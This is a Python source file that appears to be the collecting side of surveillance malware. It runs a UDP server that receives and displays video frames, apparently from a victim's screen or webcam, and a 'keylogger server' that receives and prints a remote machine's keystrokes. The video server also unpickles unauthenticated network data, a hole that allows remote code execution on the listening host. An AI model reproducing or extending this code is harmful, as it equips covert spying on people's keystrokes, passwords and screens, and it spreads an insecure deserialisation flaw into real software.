import cv2
import socket
import struct
import pickle
import numpy as np

def handle_client(client_socket):
    try:
        while True:
            request = client_socket.recv(1024).decode('utf-8')
            if not request:
                break
            print(f"Received: {request}")
            # Handle the request here (to be expanded later)
            response = "ACK"
            client_socket.send(response.encode('utf-8'))
    except socket.error as e:
        print(f"Socket error: {e}")
    finally:
        client_socket.close()


def start_video_stream_server(host='0.0.0.0', port=9999):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind((host, port))
    print(f"Video stream server listening on {host}:{port}")

    while True:
        try:
            data, addr = server_socket.recvfrom(65535)  # max UDP datagram size
            frame_data = pickle.loads(data)
            frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)

            cv2.imshow('Video Stream', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
        except Exception as e:
            print(f"Error receiving frame: {e}")
            break

    server_socket.close()
    cv2.destroyAllWindows()

def start_keylogger_server(host='0.0.0.0', port=9998):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Keylogger server listening on {host}:{port}")

    conn, addr = server_socket.accept()
    print(f"Accepted connection from {addr}")

    while True:
        key_data = conn.recv(1024).decode('utf-8')
        if not key_data:
            break
        print(f"Key pressed: {key_data}")

    conn.close()
    server_socket.close()
